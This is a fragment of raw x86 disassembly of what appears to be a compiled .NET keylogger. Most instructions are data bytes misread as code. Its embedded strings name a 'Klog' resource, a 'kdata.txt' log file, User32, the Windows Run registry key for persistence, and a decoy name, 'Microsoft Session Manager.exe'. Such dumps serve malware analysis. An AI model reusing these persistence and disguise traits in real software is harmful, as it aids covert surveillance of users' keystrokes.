  4030cd:	4b                   	dec    %ebx
  4030ce:	65 79 00             	gs jns 0x4030d1
  4030d1:	52                   	push   %edx
  4030d2:	65 67 69 73 74 72 79 	imul   $0x654b7972,%gs:0x74(%bp,%di),%esi
  4030d9:	4b 65 
  4030db:	79 00                	jns    0x4030dd
  4030dd:	67 65 74 5f          	addr16 gs je 0x403140
  4030e1:	41                   	inc    %ecx
  4030e2:	73 73                	jae    0x403157
  4030e4:	65 6d                	gs insl (%dx),%es:(%edi)
  4030e6:	62 6c 79 00          	bound  %ebp,0x0(%ecx,%edi,2)
  4030ea:	43                   	inc    %ebx
  4030eb:	6f                   	outsl  %ds:(%esi),(%dx)
  4030ec:	70 79                	jo     0x403167
  4030ee:	00 4c 6f 61          	add    %cl,0x61(%edi,%ebp,2)
  4030f2:	64 4c                	fs dec %esp
  4030f4:	69 62 72 61 72 79 00 	imul   $0x797261,0x72(%edx),%esp
  4030fb:	43                   	inc    %ebx
  4030fc:	72 65                	jb     0x403163
  4030fe:	61                   	popa
  4030ff:	74 65                	je     0x403166
  403101:	44                   	inc    %esp
  403102:	69 72 65 63 74 6f 72 	imul   $0x726f7463,0x65(%edx),%esi
  403109:	79 00                	jns    0x40310b
  40310b:	52                   	push   %edx
  40310c:	65 67 69 73 74 72 79 	imul   $0x6f007972,%gs:0x74(%bp,%di),%esi
  403113:	00 6f 
  403115:	70 5f                	jo     0x403176
  403117:	49                   	dec    %ecx
  403118:	6e                   	outsb  %ds:(%esi),(%dx)
  403119:	65 71 75             	gs jno 0x403191
  40311c:	61                   	popa
  40311d:	6c                   	insb   (%dx),%es:(%edi)
  40311e:	69 74 79 00 00 00 00 	imul   $0x80000000,0x0(%ecx,%edi,2),%esi
  403125:	80 
  403126:	bd 54 00 68 00       	mov    $0x680054,%ebp
  40312b:	65 00 20             	add    %ah,%gs:(%eax)
  40312e:	00 61 00             	add    %ah,0x0(%ecx)
  403131:	70 00                	jo     0x403133
  403133:	70 00                	jo     0x403135
  403135:	6c                   	insb   (%dx),%es:(%edi)
  403136:	00 69 00             	add    %ch,0x0(%ecx)
  403139:	63 00                	arpl   %eax,(%eax)
  40313b:	61                   	popa
  40313c:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  403140:	00 6f 00             	add    %ch,0x0(%edi)
  403143:	6e                   	outsb  %ds:(%esi),(%dx)
  403144:	00 20                	add    %ah,(%eax)
  403146:	00 77 00             	add    %dh,0x0(%edi)
  403149:	61                   	popa
  40314a:	00 73 00             	add    %dh,0x0(%ebx)
  40314d:	20 00                	and    %al,(%eax)
  40314f:	75 00                	jne    0x403151
  403151:	6e                   	outsb  %ds:(%esi),(%dx)
  403152:	00 61 00             	add    %ah,0x0(%ecx)
  403155:	62 00                	bound  %eax,(%eax)
  403157:	6c                   	insb   (%dx),%es:(%edi)
  403158:	00 65 00             	add    %ah,0x0(%ebp)
  40315b:	20 00                	and    %al,(%eax)
  40315d:	74 00                	je     0x40315f
  40315f:	6f                   	outsl  %ds:(%esi),(%dx)
  403160:	00 20                	add    %ah,(%eax)
  403162:	00 73 00             	add    %dh,0x0(%ebx)
  403165:	74 00                	je     0x403167
  403167:	61                   	popa
  403168:	00 72 00             	add    %dh,0x0(%edx)
  40316b:	74 00                	je     0x40316d
  40316d:	20 00                	and    %al,(%eax)
  40316f:	63 00                	arpl   %eax,(%eax)
  403171:	6f                   	outsl  %ds:(%esi),(%dx)
  403172:	00 72 00             	add    %dh,0x0(%edx)
  403175:	72 00                	jb     0x403177
  403177:	65 00 63 00          	add    %ah,%gs:0x0(%ebx)
  40317b:	74 00                	je     0x40317d
  40317d:	6c                   	insb   (%dx),%es:(%edi)
  40317e:	00 79 00             	add    %bh,0x0(%ecx)
  403181:	20 00                	and    %al,(%eax)
  403183:	28 00                	sub    %al,(%eax)
  403185:	30 00                	xor    %al,(%eax)
  403187:	78 00                	js     0x403189
  403189:	63 00                	arpl   %eax,(%eax)
  40318b:	30 00                	xor    %al,(%eax)
  40318d:	30 00                	xor    %al,(%eax)
  40318f:	30 00                	xor    %al,(%eax)
  403191:	30 00                	xor    %al,(%eax)
  403193:	30 00                	xor    %al,(%eax)
  403195:	37                   	aaa
  403196:	00 62 00             	add    %ah,0x0(%edx)
  403199:	29 00                	sub    %eax,(%eax)
  40319b:	2e 00 20             	add    %ah,%cs:(%eax)
  40319e:	00 43 00             	add    %al,0x0(%ebx)
  4031a1:	6c                   	insb   (%dx),%es:(%edi)
  4031a2:	00 69 00             	add    %ch,0x0(%ecx)
  4031a5:	63 00                	arpl   %eax,(%eax)
  4031a7:	6b 00 20             	imul   $0x20,(%eax),%eax
  4031aa:	00 4f 00             	add    %cl,0x0(%edi)
  4031ad:	4b                   	dec    %ebx
  4031ae:	00 20                	add    %ah,(%eax)
  4031b0:	00 74 00 6f          	add    %dh,0x6f(%eax,%eax,1)
  4031b4:	00 20                	add    %ah,(%eax)
  4031b6:	00 63 00             	add    %ah,0x0(%ebx)
  4031b9:	6c                   	insb   (%dx),%es:(%edi)
  4031ba:	00 6f 00             	add    %ch,0x0(%edi)
  4031bd:	73 00                	jae    0x4031bf
  4031bf:	65 00 20             	add    %ah,%gs:(%eax)
  4031c2:	00 74 00 68          	add    %dh,0x68(%eax,%eax,1)
  4031c6:	00 65 00             	add    %ah,0x0(%ebp)
  4031c9:	20 00                	and    %al,(%eax)
  4031cb:	61                   	popa
  4031cc:	00 70 00             	add    %dh,0x0(%eax)
  4031cf:	70 00                	jo     0x4031d1
  4031d1:	6c                   	insb   (%dx),%es:(%edi)
  4031d2:	00 69 00             	add    %ch,0x0(%ecx)
  4031d5:	63 00                	arpl   %eax,(%eax)
  4031d7:	61                   	popa
  4031d8:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4031dc:	00 6f 00             	add    %ch,0x0(%edi)
  4031df:	6e                   	outsb  %ds:(%esi),(%dx)
  4031e0:	00 2e                	add    %ch,(%esi)
  4031e2:	00 00                	add    %al,(%eax)
  4031e4:	29 20                	sub    %esp,(%eax)
  4031e6:	00 2d 00 20 00 41    	add    %ch,0x41002000
  4031ec:	00 70 00             	add    %dh,0x0(%eax)
  4031ef:	70 00                	jo     0x4031f1
  4031f1:	6c                   	insb   (%dx),%es:(%edi)
  4031f2:	00 69 00             	add    %ch,0x0(%ecx)
  4031f5:	63 00                	arpl   %eax,(%eax)
  4031f7:	61                   	popa
  4031f8:	00 74 00 69          	add    %dh,0x69(%eax,%eax,1)
  4031fc:	00 6f 00             	add    %ch,0x0(%edi)
  4031ff:	6e                   	outsb  %ds:(%esi),(%dx)
  403200:	00 20                	add    %ah,(%eax)
  403202:	00 45 00             	add    %al,0x0(%ebp)
  403205:	72 00                	jb     0x403207
  403207:	72 00                	jb     0x403209
  403209:	6f                   	outsl  %ds:(%esi),(%dx)
  40320a:	00 72 00             	add    %dh,0x0(%edx)
  40320d:	01 33                	add    %esi,(%ebx)
  40320f:	4d                   	dec    %ebp
  403210:	00 69 00             	add    %ch,0x0(%ecx)
  403213:	63 00                	arpl   %eax,(%eax)
  403215:	72 00                	jb     0x403217
  403217:	6f                   	outsl  %ds:(%esi),(%dx)
  403218:	00 73 00             	add    %dh,0x0(%ebx)
  40321b:	6f                   	outsl  %ds:(%esi),(%dx)
  40321c:	00 66 00             	add    %ah,0x0(%esi)
  40321f:	74 00                	je     0x403221
  403221:	20 00                	and    %al,(%eax)
  403223:	53                   	push   %ebx
  403224:	00 65 00             	add    %ah,0x0(%ebp)
  403227:	73 00                	jae    0x403229
  403229:	73 00                	jae    0x40322b
  40322b:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403231:	20 00                	and    %al,(%eax)
  403233:	4d                   	dec    %ebp
  403234:	00 61 00             	add    %ah,0x0(%ecx)
  403237:	6e                   	outsb  %ds:(%esi),(%dx)
  403238:	00 61 00             	add    %ah,0x0(%ecx)
  40323b:	67 00 65 00          	add    %ah,0x0(%di)
  40323f:	72 00                	jb     0x403241
  403241:	00 15 5c 00 4d 00    	add    %dl,0x4d005c
  403247:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  40324d:	6f                   	outsl  %ds:(%esi),(%dx)
  40324e:	00 73 00             	add    %dh,0x0(%ebx)
  403251:	6f                   	outsl  %ds:(%esi),(%dx)
  403252:	00 66 00             	add    %ah,0x0(%esi)
  403255:	74 00                	je     0x403257
  403257:	00 3d 5c 00 4d 00    	add    %bh,0x4d005c
  40325d:	69 00 63 00 72 00    	imul   $0x720063,(%eax),%eax
  403263:	6f                   	outsl  %ds:(%esi),(%dx)
  403264:	00 73 00             	add    %dh,0x0(%ebx)
  403267:	6f                   	outsl  %ds:(%esi),(%dx)
  403268:	00 66 00             	add    %ah,0x0(%esi)
  40326b:	74 00                	je     0x40326d
  40326d:	20 00                	and    %al,(%eax)
  40326f:	53                   	push   %ebx
  403270:	00 65 00             	add    %ah,0x0(%ebp)
  403273:	73 00                	jae    0x403275
  403275:	73 00                	jae    0x403277
  403277:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  40327d:	20 00                	and    %al,(%eax)
  40327f:	4d                   	dec    %ebp
  403280:	00 61 00             	add    %ah,0x0(%ecx)
  403283:	6e                   	outsb  %ds:(%esi),(%dx)
  403284:	00 61 00             	add    %ah,0x0(%ecx)
  403287:	67 00 65 00          	add    %ah,0x0(%di)
  40328b:	72 00                	jb     0x40328d
  40328d:	2e 00 65 00          	add    %ah,%cs:0x0(%ebp)
  403291:	78 00                	js     0x403293
  403293:	65 00 00             	add    %al,%gs:(%eax)
  403296:	5b                   	pop    %ebx
  403297:	53                   	push   %ebx
  403298:	00 6f 00             	add    %ch,0x0(%edi)
  40329b:	66 00 74 00 77       	data16 add %dh,0x77(%eax,%eax,1)
  4032a0:	00 61 00             	add    %ah,0x0(%ecx)
  4032a3:	72 00                	jb     0x4032a5
  4032a5:	65 00 5c 00 4d       	add    %bl,%gs:0x4d(%eax,%eax,1)
  4032aa:	00 69 00             	add    %ch,0x0(%ecx)
  4032ad:	63 00                	arpl   %eax,(%eax)
  4032af:	72 00                	jb     0x4032b1
  4032b1:	6f                   	outsl  %ds:(%esi),(%dx)
  4032b2:	00 73 00             	add    %dh,0x0(%ebx)
  4032b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032b6:	00 66 00             	add    %ah,0x0(%esi)
  4032b9:	74 00                	je     0x4032bb
  4032bb:	5c                   	pop    %esp
  4032bc:	00 57 00             	add    %dl,0x0(%edi)
  4032bf:	69 00 6e 00 64 00    	imul   $0x64006e,(%eax),%eax
  4032c5:	6f                   	outsl  %ds:(%esi),(%dx)
  4032c6:	00 77 00             	add    %dh,0x0(%edi)
  4032c9:	73 00                	jae    0x4032cb
  4032cb:	5c                   	pop    %esp
  4032cc:	00 43 00             	add    %al,0x0(%ebx)
  4032cf:	75 00                	jne    0x4032d1
  4032d1:	72 00                	jb     0x4032d3
  4032d3:	72 00                	jb     0x4032d5
  4032d5:	65 00 6e 00          	add    %ch,%gs:0x0(%esi)
  4032d9:	74 00                	je     0x4032db
  4032db:	56                   	push   %esi
  4032dc:	00 65 00             	add    %ah,0x0(%ebp)
  4032df:	72 00                	jb     0x4032e1
  4032e1:	73 00                	jae    0x4032e3
  4032e3:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  4032e9:	5c                   	pop    %esp
  4032ea:	00 52 00             	add    %dl,0x0(%edx)
  4032ed:	75 00                	jne    0x4032ef
  4032ef:	6e                   	outsb  %ds:(%esi),(%dx)
  4032f0:	00 00                	add    %al,(%eax)
  4032f2:	01 00                	add    %eax,(%eax)
  4032f4:	0d 55 00 73 00       	or     $0x730055,%eax
  4032f9:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  4032fd:	33 00                	xor    (%eax),%eax
  4032ff:	32 00                	xor    (%eax),%al
  403301:	00 2f                	add    %ch,(%edi)
  403303:	43                   	inc    %ebx
  403304:	00 6f 00             	add    %ch,0x0(%edi)
  403307:	75 00                	jne    0x403309
  403309:	6c                   	insb   (%dx),%es:(%edi)
  40330a:	00 64 00 20          	add    %ah,0x20(%eax,%eax,1)
  40330e:	00 6e 00             	add    %ch,0x0(%esi)
  403311:	6f                   	outsl  %ds:(%esi),(%dx)
  403312:	00 74 00 20          	add    %dh,0x20(%eax,%eax,1)
  403316:	00 63 00             	add    %ah,0x0(%ebx)
  403319:	72 00                	jb     0x40331b
  40331b:	65 00 61 00          	add    %ah,%gs:0x0(%ecx)
  40331f:	74 00                	je     0x403321
  403321:	65 00 20             	add    %ah,%gs:(%eax)
  403324:	00 66 00             	add    %ah,0x0(%esi)
  403327:	69 00 6c 00 65 00    	imul   $0x65006c,(%eax),%eax
  40332d:	3a 00                	cmp    (%eax),%al
  40332f:	20 00                	and    %al,(%eax)
  403331:	00 13                	add    %dl,(%ebx)
  403333:	45                   	inc    %ebp
  403334:	00 78 00             	add    %bh,0x0(%eax)
  403337:	63 00                	arpl   %eax,(%eax)
  403339:	65 00 70 00          	add    %dh,%gs:0x0(%eax)
  40333d:	74 00                	je     0x40333f
  40333f:	69 00 6f 00 6e 00    	imul   $0x6e006f,(%eax),%eax
  403345:	00 07                	add    %al,(%edi)
  403347:	20 00                	and    %al,(%eax)
  403349:	5b                   	pop    %ebx
  40334a:	00 20                	add    %ah,(%eax)
  40334c:	00 00                	add    %al,(%eax)
  40334e:	07                   	pop    %es
  40334f:	20 00                	and    %al,(%eax)
  403351:	5d                   	pop    %ebp
  403352:	00 20                	add    %ah,(%eax)
  403354:	00 00                	add    %al,(%eax)
  403356:	15 5c 00 6b 00       	adc    $0x6b005c,%eax
  40335b:	64 00 61 00          	add    %ah,%fs:0x0(%ecx)
  40335f:	74 00                	je     0x403361
  403361:	61                   	popa
  403362:	00 2e                	add    %ch,(%esi)
  403364:	00 74 00 78          	add    %dh,0x78(%eax,%eax,1)
  403368:	00 74 00 00          	add    %dh,0x0(%eax,%eax,1)
  40336c:	33 4b 00             	xor    0x0(%ebx),%ecx
  40336f:	6c                   	insb   (%dx),%es:(%edi)
  403370:	00 6f 00             	add    %ch,0x0(%edi)
  403373:	67 00 2e 00 50       	add    %ch,0x5000
  403378:	00 72 00             	add    %dh,0x0(%edx)
  40337b:	6f                   	outsl  %ds:(%esi),(%dx)
  40337c:	00 70 00             	add    %dh,0x0(%eax)
  40337f:	65 00 72 00          	add    %dh,%gs:0x0(%edx)
  403383:	74 00                	je     0x403385
  403385:	69 00 65 00 73 00    	imul   $0x730065,(%eax),%eax
  40338b:	2e 00 52 00          	add    %dl,%cs:0x0(%edx)
  40338f:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  403393:	6f                   	outsl  %ds:(%esi),(%dx)
  403394:	00 75 00             	add    %dh,0x0(%ebp)
  403397:	72 00                	jb     0x403399
  403399:	63 00                	arpl   %eax,(%eax)
  40339b:	65 00 73 00          	add    %dh,%gs:0x0(%ebx)
  40339f:	00 52 e8             	add    %dl,-0x18(%edx)
  4033a2:	16                   	push   %ss
  4033a3:	b7 7c                	mov    $0x7c,%bh
  4033a5:	d3 a0 42 be fa 62    	shll   %cl,0x62fabe42(%eax)
  4033ab:	21 d5                	and    %edx,%ebp
  4033ad:	c2 a2 46             	ret    $0x46a2
  4033b0:	00 04 20             	add    %al,(%eax,%eiz,1)
  4033b3:	01 01                	add    %eax,(%ecx)
  4033b5:	08 03                	or     %al,(%ebx)
  4033b7:	20 00                	and    %al,(%eax)
  4033b9:	01 05 20 01 01 11    	add    %eax,0x11010120
  4033bf:	11 04 20             	adc    %eax,(%eax,%eiz,1)
  4033c2:	01 01                	add    %eax,(%ecx)
  4033c4:	0e                   	push   %cs
  4033c5:	05 20 02 01 0e       	add    $0xe010220,%eax
  4033ca:	0e                   	push   %cs
  4033cb:	05 20 01 01 11       	add    $0x11010120,%eax
  4033d0:	55                   	push   %ebp
  4033d1:	05 00 02 02 0e       	add    $0xe020200,%eax
  4033d6:	0e                   	push   %cs
  4033d7:	05 00 02 0e 0e       	add    $0xe0e0200,%eax
  4033dc:	0e                   	push   %cs
  4033dd:	0a 00                	or     (%eax),%al
  4033df:	04 11                	add    $0x11,%al
  4033e1:	65 0e                	gs push %cs
  4033e3:	0e                   	push   %cs
  4033e4:	11 69 11             	adc    %ebp,0x11(%ecx)
  4033e7:	6d                   	insl   (%dx),%es:(%edi)
  4033e8:	06                   	push   %es
  4033e9:	00 01                	add    %al,(%ecx)
  4033eb:	1d 12 71 0e 03       	sbb    $0x30e7112,%eax
  4033f0:	00 00                	add    %al,(%eax)
  4033f2:	01 05 00 01 12 71    	add    %eax,0x71120100
  4033f8:	0e                   	push   %cs
  4033f9:	04 00                	add    $0x0,%al
  4033fb:	01 01                	add    %eax,(%ecx)
  4033fd:	08 03                	or     %al,(%ebx)
  4033ff:	00 00                	add    %al,(%eax)
  403401:	0e                   	push   %cs
  403402:	04 00                	add    $0x0,%al
  403404:	00 12                	add    %dl,(%edx)
  403406:	7d 03                	jge    0x40340b
  403408:	20 00                	and    %al,(%eax)
  40340a:	0e                   	push   %cs
  40340b:	06                   	push   %es
  40340c:	00 01                	add    %al,(%ecx)
  40340e:	0e                   	push   %cs
  40340f:	11 80 81 04 00 01    	adc    %eax,0x1000481(%eax)
  403415:	02 0e                	add    (%esi),%cl
  403417:	06                   	push   %es
  403418:	00 01                	add    %al,(%ecx)
  40341a:	12 80 89 0e 06 20    	adc    0x20060e89(%eax),%al
  403420:	01 01                	add    %eax,(%ecx)
  403422:	11 80 91 05 00 02    	adc    %eax,0x2000591(%eax)
  403428:	01 0e                	add    %ecx,(%esi)
  40342a:	0e                   	push   %cs
  40342b:	07                   	pop    %es
  40342c:	00 02                	add    %al,(%edx)
  40342e:	01 0e                	add    %ecx,(%esi)
  403430:	11 80 91 04 06 12    	adc    %eax,0x12060491(%eax)
  403436:	80 9d 06 20 01 12 80 	sbbb   $0x80,0x12012006(%ebp)
  40343d:	9d                   	popf
  40343e:	0e                   	push   %cs
  40343f:	08 20                	or     %ah,(%eax)
  403441:	03 01                	add    (%ecx),%eax
  403443:	0e                   	push   %cs
  403444:	1c 11                	sbb    $0x11,%al
  403446:	80 a1 03 07 01 18 0f 	andb   $0xf,0x18010703(%ecx)
  40344d:	07                   	pop    %es
  40344e:	07                   	pop    %es
  40344f:	12 21                	adc    (%ecx),%ah
  403451:	0e                   	push   %cs
  403452:	12 25 12 29 12 2d    	adc    0x2d122912,%ah
  403458:	11 1d 12 31 02 06    	adc    %ebx,0x6023112
  40345e:	18 04 00             	sbb    %al,(%eax,%eax,1)
  403461:	01 08                	add    %ecx,(%eax)
  403463:	18 08                	sbb    %cl,(%eax)
  403465:	00 01                	add    %al,(%ecx)
  403467:	12 80 a9 11 80 ad    	adc    -0x527fee57(%eax),%al
  40346d:	07                   	pop    %es
  40346e:	00 01                	add    %al,(%ecx)
  403470:	12 21                	adc    (%ecx),%ah
  403472:	12 80 a9 06 00 01    	adc    0x10006a9(%eax),%al
  403478:	12 80 b5 0e 05 20    	adc    0x20050eb5(%eax),%al
  40347e:	02 01                	add    (%ecx),%al
  403480:	0e                   	push   %cs
  403481:	02 04 20             	add    (%eax,%eiz,1),%al
  403484:	00 12                	add    %dl,(%edx)
  403486:	2d 03 20 00 1c       	sub    $0x1c002003,%eax
  40348b:	04 00                	add    $0x0,%al
  40348d:	01 02                	add    %eax,(%edx)
  40348f:	08 04 00             	or     %al,(%eax,%eax,1)
  403492:	01 02                	add    %eax,(%edx)
  403494:	03 06                	add    (%esi),%eax
  403496:	00 03                	add    %al,(%ebx)
  403498:	0e                   	push   %cs
  403499:	0e                   	push   %cs
  40349a:	0e                   	push   %cs
  40349b:	0e                   	push   %cs
  40349c:	03 20                	add    (%eax),%esp
  40349e:	00 02                	add    %al,(%edx)
  4034a0:	05 20 00 12 80       	add    $0x80120020,%eax
  4034a5:	c9                   	leave
  4034a6:	07                   	pop    %es
  4034a7:	20 02                	and    %al,(%edx)
  4034a9:	01 0e                	add    %ecx,(%esi)
  4034ab:	12 80 c9 08 b7 7a    	adc    0x7ab708c9(%eax),%al
  4034b1:	5c                   	pop    %esp
  4034b2:	56                   	push   %esi
  4034b3:	19 34 e0             	sbb    %esi,(%eax,%eiz,8)
  4034b6:	89 04 00             	mov    %eax,(%eax,%eax,1)
  4034b9:	80 00 00             	addb   $0x0,(%eax)
  4034bc:	04 0d                	add    $0xd,%al
  4034be:	00 00                	add    %al,(%eax)
  4034c0:	00 02                	add    %al,(%edx)
  4034c2:	06                   	push   %es
  4034c3:	0e                   	push   %cs
  4034c4:	02 06                	add    (%esi),%al
  4034c6:	08 03                	or     %al,(%ebx)
  4034c8:	06                   	push   %es
  4034c9:	12 18                	adc    (%eax),%bl
  4034cb:	03 06                	add    (%esi),%eax
  4034cd:	12 4d 03             	adc    0x3(%ebp),%cl
  4034d0:	06                   	push   %es
  4034d1:	12 51 05             	adc    0x5(%ecx),%dl
  4034d4:	00 01                	add    %al,(%ecx)
  4034d6:	01 1d 0e 08 00 04    	add    %ebx,0x400080e
  4034dc:	18 08                	sbb    %cl,(%eax)
  4034de:	12 18                	adc    (%eax),%bl
  4034e0:	18 09                	sbb    %cl,(%ecx)
  4034e2:	07                   	pop    %es
  4034e3:	00 04 18             	add    %al,(%eax,%ebx,1)
  4034e6:	18 08                	sbb    %cl,(%eax)
  4034e8:	08 18                	or     %bl,(%eax)
  4034ea:	04 00                	add    $0x0,%al
  4034ec:	01 18                	add    %ebx,(%eax)
  4034ee:	0e                   	push   %cs
  4034ef:	05 00 01 08 11       	add    $0x11080100,%eax
  4034f4:	1d 06 00 03 18       	sbb    $0x18030006,%eax
  4034f9:	08 18                	or     %bl,(%eax)
  4034fb:	18 04 00             	sbb    %al,(%eax,%eax,1)
  4034fe:	00 12                	add    %dl,(%edx)
  403500:	4d                   	dec    %ebp
  403501:	04 00                	add    $0x0,%al
  403503:	00 12                	add    %dl,(%edx)
  403505:	51                   	push   %ecx
  403506:	05 00 01 01 12       	add    $0x12010100,%eax
  40350b:	51                   	push   %ecx
  40350c:	05 20 02 01 1c       	add    $0x1c010220,%eax
  403511:	18 06                	sbb    %al,(%esi)
  403513:	20 03                	and    %al,(%ebx)
  403515:	18 08                	sbb    %cl,(%eax)
  403517:	18 18                	sbb    %bl,(%eax)
  403519:	0a 20                	or     (%eax),%ah
  40351b:	05 12 39 08 18       	add    $0x18083912,%eax
  403520:	18 12                	sbb    %dl,(%edx)
  403522:	3d 1c 05 20 01       	cmp    $0x120051c,%eax
  403527:	18 12                	sbb    %dl,(%edx)
  403529:	39 04 08             	cmp    %eax,(%eax,%ecx,1)
  40352c:	00 12                	add    %dl,(%edx)
  40352e:	4d                   	dec    %ebp
  40352f:	04 08                	add    $0x8,%al
  403531:	00 12                	add    %dl,(%edx)
  403533:	51                   	push   %ecx
  403534:	08 01                	or     %al,(%ecx)
  403536:	00 08                	add    %cl,(%eax)
  403538:	00 00                	add    %al,(%eax)
  40353a:	00 00                	add    %al,(%eax)
  40353c:	00 1e                	add    %bl,(%esi)
  40353e:	01 00                	add    %eax,(%eax)
  403540:	01 00                	add    %eax,(%eax)
  403542:	54                   	push   %esp
  403543:	02 16                	add    (%esi),%dl
  403545:	57                   	push   %edi
  403546:	72 61                	jb     0x4035a9
  403548:	70 4e                	jo     0x403598
  40354a:	6f                   	outsl  %ds:(%esi),(%dx)
  40354b:	6e                   	outsb  %ds:(%esi),(%dx)
  40354c:	45                   	inc    %ebp
  40354d:	78 63                	js     0x4035b2
  40354f:	65 70 74             	gs jo  0x4035c6
  403552:	69 6f 6e 54 68 72 6f 	imul   $0x6f726854,0x6e(%edi),%ebp
  403559:	77 73                	ja     0x4035ce
  40355b:	01 08                	add    %ecx,(%eax)
  40355d:	01 00                	add    %eax,(%eax)
  40355f:	02 00                	add    (%eax),%al
  403561:	00 00                	add    %al,(%eax)
  403563:	00 00                	add    %al,(%eax)
  403565:	47                   	inc    %edi
  403566:	01 00                	add    %eax,(%eax)
  403568:	1a 2e                	sbb    (%esi),%ch
  40356a:	4e                   	dec    %esi
  40356b:	45                   	inc    %ebp
  40356c:	54                   	push   %esp
  40356d:	46                   	inc    %esi
  40356e:	72 61                	jb     0x4035d1
  403570:	6d                   	insl   (%dx),%es:(%edi)
  403571:	65 77 6f             	gs ja  0x4035e3
  403574:	72 6b                	jb     0x4035e1
  403576:	2c 56                	sub    $0x56,%al
  403578:	65 72 73             	gs jb  0x4035ee
  40357b:	69 6f 6e 3d 76 34 2e 	imul   $0x2e34763d,0x6e(%edi),%ebp
  403582:	30 01                	xor    %al,(%ecx)
  403584:	00 54 0e 14          	add    %dl,0x14(%esi,%ecx,1)
  403588:	46                   	inc    %esi
  403589:	72 61                	jb     0x4035ec
  40358b:	6d                   	insl   (%dx),%es:(%edi)
  40358c:	65 77 6f             	gs ja  0x4035fe
  40358f:	72 6b                	jb     0x4035fc
  403591:	44                   	inc    %esp
  403592:	69 73 70 6c 61 79 4e 	imul   $0x4e79616c,0x70(%ebx),%esi
  403599:	61                   	popa
  40359a:	6d                   	insl   (%dx),%es:(%edi)
  40359b:	65 10 2e             	adc    %ch,%gs:(%esi)
  40359e:	4e                   	dec    %esi
  40359f:	45                   	inc    %ebp
  4035a0:	54                   	push   %esp
  4035a1:	20 46 72             	and    %al,0x72(%esi)
  4035a4:	61                   	popa
  4035a5:	6d                   	insl   (%dx),%es:(%edi)
  4035a6:	65 77 6f             	gs ja  0x403618
  4035a9:	72 6b                	jb     0x403616
  4035ab:	20 34 41             	and    %dh,(%ecx,%eax,2)
  4035ae:	01 00                	add    %eax,(%eax)
  4035b0:	33 53 79             	xor    0x79(%ebx),%edx
  4035b3:	73 74                	jae    0x403629
  4035b5:	65 6d                	gs insl (%dx),%es:(%edi)
  4035b7:	2e 52                	cs push %edx
  4035b9:	65 73 6f             	gs jae 0x40362b
  4035bc:	75 72                	jne    0x403630
  4035be:	63 65 73             	arpl   %esp,0x73(%ebp)
  4035c1:	2e 54                	cs push %esp
  4035c3:	6f                   	outsl  %ds:(%esi),(%dx)
  4035c4:	6f                   	outsl  %ds:(%esi),(%dx)
  4035c5:	6c                   	insb   (%dx),%es:(%edi)
  4035c6:	73 2e                	jae    0x4035f6
  4035c8:	53                   	push   %ebx
  4035c9:	74 72                	je     0x40363d
  4035cb:	6f                   	outsl  %ds:(%esi),(%dx)
  4035cc:	6e                   	outsb  %ds:(%esi),(%dx)
  4035cd:	67 6c                	insb   (%dx),%es:(%di)
  4035cf:	79 54                	jns    0x403625
  4035d1:	79 70                	jns    0x403643
  4035d3:	65 64 52             	gs fs push %edx
  4035d6:	65 73 6f             	gs jae 0x403648
  4035d9:	75 72                	jne    0x40364d
  4035db:	63 65 42             	arpl   %esp,0x42(%ebp)
  4035de:	75 69                	jne    0x403649
  4035e0:	6c                   	insb   (%dx),%es:(%edi)
  4035e1:	64 65 72 08          	fs gs jb 0x4035ed
  4035e5:	31 36                	xor    %esi,(%esi)
  4035e7:	2e 30 2e             	xor    %ch,%cs:(%esi)
  4035ea:	30 2e                	xor    %ch,(%esi)
  4035ec:	30 00                	xor    %al,(%eax)
  4035ee:	00 04 01             	add    %al,(%ecx,%eax,1)
  4035f1:	00 00                	add    %al,(%eax)
  4035f3:	00 b4 00 00 00 ce ca 	add    %dh,-0x35320000(%eax,%eax,1)
  4035fa:	ef                   	out    %eax,(%dx)
  4035fb:	be 01 00 00 00       	mov    $0x1,%esi
  403600:	91                   	xchg   %eax,%ecx
  403601:	00 00                	add    %al,(%eax)
  403603:	00 6c 53 79          	add    %ch,0x79(%ebx,%edx,2)
  403607:	73 74                	jae    0x40367d
  403609:	65 6d                	gs insl (%dx),%es:(%edi)
  40360b:	2e 52                	cs push %edx
  40360d:	65 73 6f             	gs jae 0x40367f
  403610:	75 72                	jne    0x403684
  403612:	63 65 73             	arpl   %esp,0x73(%ebp)
  403615:	2e 52                	cs push %edx
  403617:	65 73 6f             	gs jae 0x403689
  40361a:	75 72                	jne    0x40368e
  40361c:	63 65 52             	arpl   %esp,0x52(%ebp)
  40361f:	65 61                	gs popa
  403621:	64 65 72 2c          	fs gs jb 0x403651
  403625:	20 6d 73             	and    %ch,0x73(%ebp)
  403628:	63 6f 72             	arpl   %ebp,0x72(%edi)
  40362b:	6c                   	insb   (%dx),%es:(%edi)
  40362c:	69 62 2c 20 56 65 72 	imul   $0x72655620,0x2c(%edx),%esp
  403633:	73 69                	jae    0x40369e
  403635:	6f                   	outsl  %ds:(%esi),(%dx)
  403636:	6e                   	outsb  %ds:(%esi),(%dx)
  403637:	3d 34 2e 30 2e       	cmp    $0x2e302e34,%eax
  40363c:	30 2e                	xor    %ch,(%esi)
  40363e:	30 2c 20             	xor    %ch,(%eax,%eiz,1)
  403641:	43                   	inc    %ebx
  403642:	75 6c                	jne    0x4036b0
  403644:	74 75                	je     0x4036bb
  403646:	72 65                	jb     0x4036ad
  403648:	3d 6e 65 75 74       	cmp    $0x7475656e,%eax
  40364d:	72 61                	jb     0x4036b0
  40364f:	6c                   	insb   (%dx),%es:(%edi)
  403650:	2c 20                	sub    $0x20,%al
  403652:	50                   	push   %eax
  403653:	75 62                	jne    0x4036b7
  403655:	6c                   	insb   (%dx),%es:(%edi)
  403656:	69 63 4b 65 79 54 6f 	imul   $0x6f547965,0x4b(%ebx),%esp
  40365d:	6b 65 6e 3d          	imul   $0x3d,0x6e(%ebp),%esp
  403661:	62 37                	bound  %esi,(%edi)
  403663:	37                   	aaa
  403664:	61                   	popa
  403665:	35 63 35 36 31       	xor    $0x31363563,%eax
  40366a:	39 33                	cmp    %esi,(%ebx)
  40366c:	34 65                	xor    $0x65,%al
  40366e:	30 38                	xor    %bh,(%eax)
